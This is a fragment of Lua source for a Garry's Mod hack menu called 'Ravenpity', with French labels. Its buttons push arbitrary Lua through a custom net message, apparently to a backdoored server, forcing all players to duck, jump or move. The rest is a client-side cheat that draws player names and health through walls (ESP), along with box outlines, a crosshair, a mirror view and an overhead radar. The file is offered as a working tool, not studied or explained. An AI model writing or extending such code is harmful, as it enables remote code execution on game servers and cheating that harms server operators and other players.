startsetduck:SetTextColor( Color(  255, 255, 255 ) )        
end
startsetduck.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("+duck") end]])
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "S'accroupir activé" )
end
end
local   stopsetduck = vgui.Create( "DButton", BackgroundSupportPanel)
stopsetduck:SetPos( 365, 95)
stopsetduck:SetSize( 20, 20  )
stopsetduck:SetText( "X" )
stopsetduck.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if stopsetduck:IsHovered() then
stopsetduck:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
stopsetduck:SetTextColor( Color( 255, 255, 255 ) )        
end
stopsetduck.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("-duck") end]])
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "S'accroupir désactivé" )
end
end

-------------------------------------------------------------------------------------|

local startsetjump = vgui.Create("DButton", BackgroundSupportPanel )
startsetjump:SetPos( 0, 120)
startsetjump:SetSize( 400, 30  )
startsetjump:SetText("Sauter")
startsetjump:SetTextColor(Color(255,255,255,255))
startsetjump.Paint = function(panel, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if startsetjump:IsHovered() then
startsetjump:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
startsetjump:SetTextColor( Color(  255, 255, 255 ) )        
end
startsetjump.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("+jump") end]])
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Saut activé" )
end
end
local   stopsetjump = vgui.Create( "DButton", BackgroundSupportPanel)
stopsetjump:SetPos( 365, 125)
stopsetjump:SetSize( 20, 20  )
stopsetjump:SetText( "X" )
stopsetjump.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if stopsetjump:IsHovered() then
stopsetjump:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
stopsetjump:SetTextColor( Color( 255, 255, 255 ) )        
end
stopsetjump.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("-jump") end]])
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Saut désactivé" )
end
end

-------------------------------------------------------------------------------------|

local startsetforward = vgui.Create("DButton", BackgroundSupportPanel )
startsetforward:SetPos( 0, 150)
startsetforward:SetSize( 400, 30  )
startsetforward:SetText("Avancer")
startsetforward:SetTextColor(Color(255,255,255,255))
startsetforward.Paint = function(panel, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if startsetforward:IsHovered() then
startsetforward:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
startsetforward:SetTextColor( Color(  255, 255, 255 ) )       
end
startsetforward.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("+forward") end]])
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Avancer activé" )
end
end
local   stopsetforward = vgui.Create( "DButton", BackgroundSupportPanel)
stopsetforward:SetPos( 365, 155)
stopsetforward:SetSize( 20, 20  )
stopsetforward:SetText( "X" )
stopsetforward.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if stopsetforward:IsHovered() then
stopsetforward:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
stopsetforward:SetTextColor( Color( 255, 255, 255 ) )       
end
stopsetforward.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("-forward") end]])
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Avancer désactivé" )
end
end

-------------------------------------------------------------------------------------|

local startsetback = vgui.Create("DButton", BackgroundSupportPanel )
startsetback:SetPos( 0, 180)
startsetback:SetSize( 400, 30  )
startsetback:SetText("Reculer")
startsetback:SetTextColor(Color(255,255,255,255))
startsetback.Paint = function(panel, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if startsetback:IsHovered() then
startsetback:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
startsetback:SetTextColor( Color(  255, 255, 255 ) )        
end
startsetback.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("+back") end]])
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Reculer activé" )
end
end

local   stopsetback = vgui.Create( "DButton", BackgroundSupportPanel)
stopsetback:SetPos( 365, 185)
stopsetback:SetSize( 20, 20  )
stopsetback:SetText( "X" )
stopsetback.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if stopsetback:IsHovered() then
stopsetback:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
stopsetback:SetTextColor( Color( 255, 255, 255 ) )        
end
stopsetback.DoClick = function()
net.Start(ravenhacknetnet)
net.WriteString([[for k,v in pairs(player.GetAll()) do v:ConCommand("-back") end]])
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ravenpity", "] ", Color( 255, 255, 255 ), "Reculer désactivé" )
end
end
end

end)
/*======================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
ESP / CROSSHAIR / RADAR / MIRROIR
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================
========================================================================================================================================================================================*/
local ravenpityESP = CreateClientConVar( "ravenpity_esp", 1, true, false )
local ravenpityCROSSHAIR = CreateClientConVar( "ravenpity_chair", 0, true, false ) 
local LESPMirror = CreateClientConVar( "lix_lesp_mirror", 0, true, false )
local LESPMirrorx = CreateClientConVar( "lix_lesp_mirrorx", 0, true, false )
local LESPMirrory = CreateClientConVar( "lix_lesp_mirrory", 0, true, false )
local LESPMirrorw = CreateClientConVar( "lix_lesp_mirrorw", 300, true, false )
local LESPMirrorh = CreateClientConVar( "lix_lesp_mirrorh", 300, true, false )
local LESPMirrorpitch = CreateClientConVar( "lix_lesp_mirrorpitch", -2, true, false )
local LESPMirroryaw = CreateClientConVar( "lix_lesp_mirroryaw", 180, true, false )
local LESPMirrorroll = CreateClientConVar( "lix_lesp_mirrorroll", 0, true, false )

local LESPRadar = CreateClientConVar( "lix_lesp_radar", 0, true, false )
local LESPRadarx = CreateClientConVar( "lix_lesp_radarx", 0, true, false )
local LESPRadary = CreateClientConVar( "lix_lesp_radary", 0, true, false )
local LESPRadarw = CreateClientConVar( "lix_lesp_radarw", 300, true, false )
local LESPRadarh = CreateClientConVar( "lix_lesp_radarh", 300, true, false )
local LESPRadarfov = CreateClientConVar( "lix_lesp_radarfov", 300, true, false )
local LESPRadarauto = CreateClientConVar( "lix_lesp_radarauto", 1, true, false )
local function coordinates( ent )
local min, max = ent:OBBMins(), ent:OBBMaxs()
local corners = {
Vector( min.x, min.y, min.z ),
Vector( min.x, min.y, max.z ),
Vector( min.x, max.y, min.z ),
Vector( min.x, max.y, max.z ),
Vector( max.x, min.y, min.z ),
Vector( max.x, min.y, max.z ),
Vector( max.x, max.y, min.z ),
Vector( max.x, max.y, max.z )
}
local minX, minY, maxX, maxY = ScrW() * 2, ScrH() * 2, 0, 0
for _, corner in pairs( corners ) do
local onScreen = ent:LocalToWorld( corner ):ToScreen()
minX, minY = math.min( minX, onScreen.x ), math.min( minY, onScreen.y )
maxX, maxY = math.max( maxX, onScreen.x ), math.max( maxY, onScreen.y )
end
return minX, minY, maxX, maxY
end
local function HeadPos(ply)
if IsValid(ply) then
local hbone = ply:LookupBone("ValveBiped.Bip01_Head1")
return ply:GetBonePosition(hbone)
else return end
end
local function Visible(ply)
local trace = {start = LocalPlayer():GetShootPos(),endpos = {LocalPlayer(), ply}}
local tr = util.TraceLine(trace)
if tr.Fraction == 1 then
return true
else
return false
end 
end
local function IsSteamFriend( ply )
return ply:GetFriendStatus() == "friend"
end
local function FillRGBA(x,y,w,h,col)
surface.SetDrawColor( col.r, col.g, col.b, col.a );
surface.DrawRect( x, y, w, h );
end
local function OutlineRGBA(x,y,w,h,col)
surface.SetDrawColor( col.r, col.g, col.b, col.a );
surface.DrawOutlinedRect( x, y, w, h );
end
local function DrawCrosshair()
local w = ScrW() / 2.003;
local h = ScrH() / 2;
FillRGBA( w - 13, h, 30, 2, Color(154, 99, 255, 255 ) );
FillRGBA( w, h - 13.8, 2, 30, Color(154, 99, 255, 255 ) );
end
function DrawESP()
if ravenpityESP:GetInt() == 1 then
for k, v in pairs(ents.GetAll()) do
if v ~= LocalPlayer() then
if( v:IsNPC() ) then
local drawColor = Color(255, 255, 255, 255);
local drawPosit = v:GetPos():ToScreen();
if( Visible(v) ) then
drawColor = Color( 154, 99, 255, 255 );
else
drawColor = Color( 154, 99, 255, 255 );
end
local textData = {}
textData.pos = {}
textData.pos[1] = drawPosit.x;
textData.pos[2] = drawPosit.y;
textData.color = drawColor;
textData.text = "♦";
textData.font = "DefaultFixed";
textData.xalign = TEXT_ALIGN_CENTER;
textData.yalign = TEXT_ALIGN_CENTER;
draw.Text( textData );
elseif( v:IsPlayer() and v:Health() > 0 and v:Alive() ) then
local drawColor = Color( 154, 99, 255, 255 );
local drawPosit = v:GetPos():ToScreen();
if( Visible(v) ) then
drawColor.a = 255;
else
drawColor.r = Color( 154, 99, 255, 255 )
drawColor.g = Color( 154, 99, 255, 255 )
drawColor.b = Color( 154, 99, 255, 255 )
end
local textData = {}
textData.pos = {}
textData.pos[1] = drawPosit.x;
textData.pos[2] = drawPosit.y;
textData.color = Color( 255, 255, 255, 255 );
textData.text = v:GetName();
textData.font = "DefaultFixed";
textData.xalign = TEXT_ALIGN_CENTER;
textData.yalign = TEXT_ALIGN_CENTER;
draw.Text( textData );
local max_health = 100;
if( v:Health() > max_health ) then
max_health = v:Health();
end
local mx = max_health / 4;
local mw = v:Health() / 4;
local drawPosHealth = drawPosit;
drawPosHealth.x = drawPosHealth.x - ( mx / 2 );
drawPosHealth.y = drawPosHealth.y + 10;
FillRGBA( drawPosHealth.x - 1, drawPosHealth.y - 1, mx + 2, 4 + 2, Color( 0, 0, 0, 255 ) );
FillRGBA( drawPosHealth.x, drawPosHealth.y, mw, 4, drawColor );
end
end
end
end
end
function DrawESPCORNER()
if ravenpityESP:GetInt() == 1 then
for k,v in pairs(player.GetAll()) do
local x1,y1,x2,y2 = coordinates(v)
surface.SetDrawColor(color_white)
surface.DrawLine( x1, y1, math.min( x1 + 5, x2 ), y1 )
surface.DrawLine( x1, y1, x1, math.min( y1 + 5, y2 ) )
surface.DrawLine( x2, y1, math.max( x2 - 5, x1 ), y1 )
surface.DrawLine( x2, y1, x2, math.min( y1 + 5, y2 ) )
surface.DrawLine( x1, y2, math.min( x1 + 5, x2 ), y2 )
surface.DrawLine( x1, y2, x1, math.max( y2 - 5, y1 ) )
surface.DrawLine( x2, y2, math.max( x2 - 5, x1 ), y2 )
surface.DrawLine( x2, y2, x2, math.max( y2 - 5, y1 ) )
end
end
end
function DrawXHair()
if( ravenpityCROSSHAIR:GetInt() == 1 ) then
DrawCrosshair();
end
end
local function CommandesDraw()
if LESPMirror:GetInt() > 0 then
local pitch = LESPMirrorpitch:GetInt()
if pitch < 0 then pitch = pitch * LocalPlayer():EyeAngles().p end
local yaw = LESPMirroryaw:GetInt()
if yaw < 0 then yaw = yaw * LocalPlayer():EyeAngles().y end
local roll = LESPMirrorroll:GetInt()
if roll < 0 then roll = roll * LocalPlayer():EyeAngles().r end
local Cam = {}
Cam.angles = Angle( LocalPlayer():EyeAngles().p + pitch, LocalPlayer():EyeAngles().y + yaw, LocalPlayer():EyeAngles().r + roll )
Cam.origin = LocalPlayer():GetShootPos()
Cam.x = LESPMirrorx:GetInt()
Cam.y = LESPMirrory:GetInt()
Cam.w = LESPMirrorw:GetInt()
Cam.h = LESPMirrorh:GetInt()
render.RenderView( Cam )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( LESPMirrorx:GetInt(), LESPMirrory:GetInt(), LESPMirrorw:GetInt(),LESPMirrorh:GetInt() )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawRect( ScrW() / 2 - 1, ScrH() / 2 - 1, 2, 2 )
end
if LESPRadar:GetInt() > 0 then
local Cam = {}
Cam.angles = Angle( 90, LocalPlayer():EyeAngles().y, 0 )
local Zvar = LESPRadarfov:GetInt()
if LESPRadarauto:GetInt() > 0 then
local trace = {}
trace.start = LocalPlayer():GetPos() + Vector( 0, 0, 5 )
trace.endpos = LocalPlayer():GetPos() + Vector( 0, 0, LESPRadarfov:GetInt() )
trace.filter = LocalPlayer()
if util.TraceLine( trace ).Hit then
Zvar = util.TraceLine( trace ).HitPos.z - 5 - LocalPlayer():GetPos().z
end
end
Cam.origin = LocalPlayer():GetPos() + Vector( 0, 0, Zvar )
Cam.x = LESPRadarx:GetInt()
Cam.y = LESPRadary:GetInt()
Cam.w = LESPRadarw:GetInt()
Cam.h = LESPRadarh:GetInt()
render.RenderView( Cam )
surface.SetDrawColor( 0, 0, 0, 255 )
surface.DrawOutlinedRect( LESPRadarx:GetInt(), LESPRadary:GetInt(), LESPRadarw:GetInt(),LESPRadarh:GetInt() )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawRect( ScrW() / 2 - 1, ScrH() / 2 - 1, 2, 2 )
end
end
hook.Add( "HUDPaint", "LESP", CommandesDraw )
hook.Add( "HUDPaint", "DrawESP", DrawESP );
hook.Add( "HUDPaint", "DrawESPCORNER", DrawESPCORNER );
hook.Add( "HUDPaint", "DrawXHair", DrawXHair );
hook.Add( "HUDPaint", "DrawXHair", DrawXHair );
/*======================================================================================================================================================================================*/




